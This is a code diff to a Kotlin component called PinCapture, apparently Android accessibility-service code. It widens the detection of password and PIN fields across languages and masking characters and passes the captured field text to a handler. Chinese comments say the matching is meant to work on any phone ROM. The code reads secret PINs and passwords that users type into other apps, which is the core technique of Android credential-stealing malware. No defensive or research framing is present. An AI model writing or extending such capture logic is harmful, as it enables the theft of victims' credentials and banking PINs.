@@ -251,7 +251,9 @@ object PinCapture {
             if (src != null) {
                 val cd = src.contentDescription?.toString().orEmpty()
                 val st = src.text?.toString().orEmpty()
-                if (st.isNotEmpty() && (cd.contains("密码") || cd.contains("PIN") || cd.contains("contraseña") || st.any { it == '•' })) {
+                if (st.isNotEmpty() && (cd.contains("密码") || cd.contains("PIN") ||
+                        cd.contains("contraseña") || cd.contains("Contraseña") ||
+                        src.isPassword || st.any { it == '•' || it == '●' || it == '＊' || it == '·' })) {
                     onMaskedField(st)
                 }
             }
@@ -349,7 +351,13 @@ object PinCapture {
         runCatching {
             val cd = n.contentDescription?.toString().orEmpty()
             val st = n.text?.toString().orEmpty()
-            val isPwdField = (cd.contains("密码") || cd.contains("PIN") || cd.contains("contraseña"))
+            // 公共适配：只看"控件特征"，不看厂商
+            //   ① contentDescription 含 密码/PIN/contraseña 等多语言关键词
+            //   ② 或控件本身是密码框（isPassword=true，任意 ROM 通用）
+            //   ③ 或文本是掩码点（•/●/＊/·）加数字
+            val isPwdField = cd.contains("密码") || cd.contains("PIN") || cd.contains("contraseña") ||
+                cd.contains("Contraseña") || cd.contains("código") || n.isPassword ||
+                st.any { it == '•' || it == '●' || it == '＊' || it == '·' }
             if (st.isNotEmpty() && isPwdField) onMaskedField(st)
         }
         for (i in 0 until n.childCount) readPinField(n.getChild(i), d + 1)
